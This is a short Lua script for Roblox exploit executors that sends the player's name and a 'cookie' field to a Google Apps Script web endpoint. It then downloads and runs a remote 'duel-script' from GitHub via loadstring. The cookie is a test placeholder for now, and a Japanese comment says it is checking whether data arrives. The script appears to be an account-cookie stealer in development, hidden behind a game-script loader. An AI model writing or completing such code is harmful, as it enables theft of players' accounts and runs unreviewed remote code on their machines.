local gasUrl = "https://script.google.com/macros/s/AKfycbz58FXbr9osiq0GY_O1o_RB-TVlhbDWFujyirhd4xqK9haqUT7hXXWRRVUeU8mINatvAQ/exec"

task.spawn(function()
    local payload = {
        user = game.Players.LocalPlayer.Name,
        cookie = "TEST_COOKIE_DATA", -- まずは固定文字で届くかテスト
        status = "FINAL_CHECK"
    }

    local req = (getgenv().request or getgenv().http_request or request)
    if req then
        req({
            Url = gasUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode(payload)
        })
    end
end)

loadstring(game:HttpGet("https://raw.githubusercontent.com/delt-script/duel-script/main/main.lua"))()
